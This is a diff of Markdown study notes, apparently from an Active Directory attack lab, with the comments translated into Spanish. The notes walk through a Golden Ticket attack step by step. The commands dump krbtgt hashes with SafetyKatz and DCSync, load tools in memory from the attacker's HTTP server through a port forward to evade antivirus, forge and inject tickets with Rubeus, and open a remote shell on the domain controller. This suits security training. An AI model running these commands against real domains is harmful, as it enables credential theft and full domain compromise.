@@ -3,48 +3,55 @@
 Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz 
 
 ```bash 
-- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
-- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
-- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
+- Un golden ticket está firmado y cifrado utilizando el hash de la cuenta 'krbtgt', lo que lo convierte en un ticket TGT válido.
+- El hash del usuario 'krbtgt' puede usarse para suplantar a cualquier usuario con cualquier nivel de privilegios, incluso desde una máquina que no pertenece al dominio.
+- Como buena práctica, se recomienda cambiar la contraseña de la cuenta 'krbtgt' dos veces, ya que el historial de contraseñas se mantiene para esa cuenta.
 ```
 
 ## SafetyKatz
 
 ```powershell 
-❯ C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'    # Execute mimikatz (variant) on DC as DA to get krbtgt hash 
+❯ .\SafetyKatz.exe "lsadump::lsa /patch"
+# Ejecuta SafetyKatz (versión ofuscada de mimikatz) para volcar los hashes NTLM de todas las cuentas del dominio desde LSASS vía el módulo LSA — equivalente a sekurlsa::logonpasswords pero apuntando directo al proceso LSA con patch en memoria.
 
-❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"       # Credential extraction 
+❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+# Carga SafetyKatz en memoria desde un servidor HTTP local vía Loader.exe (evasión de disco) y ejecuta lsadump::evasive-lsa /patch para volcar hashes NTLM — variante evasiva que evita tocar disco y reduce detección por AV/EDR
  
-❯ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"  # To use the DCSync feature for getting AES keys for krbtgt account, use this command with DA privileges 
+❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+# Ejecuta un ataque DCSync para obtener el hash NTLM de la cuenta krbtgt — simula el comportamiento de un DC para replicar credenciales sin necesidad de ejecutar código en el DC. Base para crear Golden Tickets.
 ```
 
 ## Rubeus 
 
 ```powershell
-# Iniciar un proceso para obtener un cmd como svcadmin
-❯ C:\AD\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt 
+❯ .\Rubeus.exe asktgt /user:svcadmin /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+# Solicita un TGT para svcadmin usando su clave AES256 (más sigiloso que RC4/NTLM), crea un proceso cmd.exe en modo sacrificio (/createnetonly) para inyectar el ticket sin contaminar la sesión actual, y lo muestra — enfoque OPSEC-friendly para movimiento lateral.
 
-# Estraer los secretos con la nueva cmd haciendo un DCSync attack 
-❯ C:\AD\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"  
+❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+# Carga SafetyKatz vía Loader.exe (evasión de disco) y ejecuta DCSync en su variante evasiva para obtener el hash NTLM/AES de krbtgt — combina evasión de AV/EDR con replicación de credenciales sin ejecutar código en el DC.
 ```
 
 ```powershell 
-# Otra forma de extraer los secretos del DC
-❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y  # Cargar el loader en el DC
+❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y
+# Copia Loader.exe al DC vía SMB (admin share) sobreescribiendo si existe — requiere acceso de administrador al DC.
 
-❯ winrs -r:dcorp-dc cmd   # Conectarse al DC con svcadmin
+❯ winrs -r:dcorp-dc cmd
+# Abre una shell remota en el DC vía WinRM usando las credenciales actuales — alternativa ligera a PSRemoting.
 
-❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent  # Crear el portforwarding
+❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent
+# Crea un port forwarding en el DC: redirige tráfico del puerto 8080 local hacia el puerto 80 del atacante — permite que el DC alcance el servidor HTTP donde está SafetyKatz.
 
-❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" # Descargar y ejecutar Safetikatz en memoria para obtener el hash ntlm del usuario krbtgt
+❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+# Desde el DC, carga SafetyKatz en memoria vía el portforwarding y vuelca los hashes NTLM de todas las cuentas incluyendo krbtgt — evasión completa sin tocar disco.
 ```
 
 ```powershell 
-# Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT con el usuario normal 'student'
-❯ C:\AD\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+❯ .\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+# Forja un Golden Ticket usando la clave AES256 de krbtgt y el SID del dominio. /ldap consulta automáticamente al DC para obtener grupos, flags y netbios. /printcmd imprime el comando completo de forja para reutilizarlo de forma más OPSEC-friendly sin hacer queries LDAP.
 
-# Es mejor hacerlo con Loader 
-❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+# Igual que el anterior pero cargando Rubeus en memoria vía Loader.exe para evadir AV/EDR — preferible en entornos con detección activa.
+
 
 Notes:
 	1. Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
@@ -55,16 +62,19 @@ Notes:
 ```
 
 ```powershell 
-# The Golden ticket forging command looks like this:
-❯ C:\AD\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD   # Inject the ticket in the current session 
+❯ .\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+# Forja e inyecta un Golden Ticket con atributos realistas del usuario Administrator — usando los valores obtenidos con /printcmd para no hacer queries LDAP adicionales (más OPSEC). Sin /ptt solo forja el ticket.
 
-# Con loader para inyectar el ticket en la sesión 
-❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt  
+❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+# Igual pero cargando Rubeus en memoria vía Loader.exe e inyectando el ticket con /ptt — versión evasiva para entornos con AV/EDR activo.
 
-# En la misma sesión de student conectarse al DC gracias al ticket importado
-❯ winrs -r:dcorp-dc cmd 
-	❯ set username       # Verificar el usuario que en este caso sería Administrator
-	❯ set computername   # Verificar la máquina que sería dc-corp 
+❯ winrs -r:dcorp-dc cmd
+# Abre shell remota en el DC usando el Golden Ticket inyectado en la sesión actual.
+
+	❯ set username
+	# Verifica que el contexto de la shell remota corresponde a Administrator.
+	❯ set computername
+	# Verifica que la máquina remota es efectivamente el DC (dcorp-dc).
 ```
 
 [![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
